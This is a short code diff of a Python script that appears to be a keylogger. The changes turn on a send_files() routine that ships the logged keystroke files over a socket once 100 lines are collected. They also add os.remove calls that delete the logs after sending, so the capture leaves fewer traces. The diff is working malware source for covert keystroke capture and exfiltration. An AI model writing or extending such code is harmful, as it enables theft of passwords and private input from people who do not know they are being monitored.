@@ -84,12 +84,14 @@ def list(k):
                 k = "']'"
         string = string + k[1]
     if count_line >= 100 :
+        count_line = 0
         try:
-            #send_file()
-            count_line = 0
-            open(namefile, "w").close()
+            send_files()
+            open(namefile, "w").close()  #supprime le .txt en cours dans lequel le script écrit actuellement
+                                         #mais useless vu qu'on supprime dans send_files pour finir
         except:
-            print('mdr')
+            with open(namefile, "a") as f:
+                f.write("send_files error")
 
 def on_release(key):
     global ctrl_l, alt_r, shift, caps
@@ -145,7 +147,7 @@ def send_files():
 
         # Save that file and goes to the next one
         socket.send("STOCK\n".encode("latin1"))
-
+        os.remove(text_file)
     socket.send("END\n".encode("latin1"))
     socket.close()
 
